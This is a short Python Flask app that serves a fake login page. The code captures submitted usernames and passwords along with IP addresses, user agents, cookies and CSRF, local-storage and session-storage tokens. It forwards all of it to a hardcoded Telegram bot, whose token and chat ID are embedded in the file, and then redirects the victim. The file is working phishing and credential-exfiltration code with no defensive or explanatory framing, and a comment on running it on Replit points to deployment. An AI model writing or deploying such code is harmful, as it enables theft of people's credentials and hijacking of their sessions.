from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

# Replace with your real Telegram bot values
TELEGRAM_BOT_TOKEN = '7857705459:AAHaGE6-uZIzv34uuWfqWdfbtP0T9jrvDbU'
TELEGRAM_CHAT_ID = '5053464023'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    requests.post(url, data=payload)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        csrf_token = request.form.get('csrf_token')
        local_token = request.form.get('local_token')
        session_token = request.form.get('session_token')

        ip = request.remote_addr
        cookies = request.cookies
        user_agent = request.headers.get('User-Agent')

        message = f"""
New Login Captured:
Username: {username}
Password: {password}
IP Address: {ip}
User Agent: {user_agent}
Cookies: {dict(cookies)}
CSRF Token: {csrf_token}
LocalStorage Token: {local_token}
SessionStorage Token: {session_token}
        """

        send_to_telegram(message)
        return redirect('https://example.com')  # Replace with real redirect

    return render_template('login.html')

# Important for Replit
if __name__ == '__main__':
    app.run(debug=True)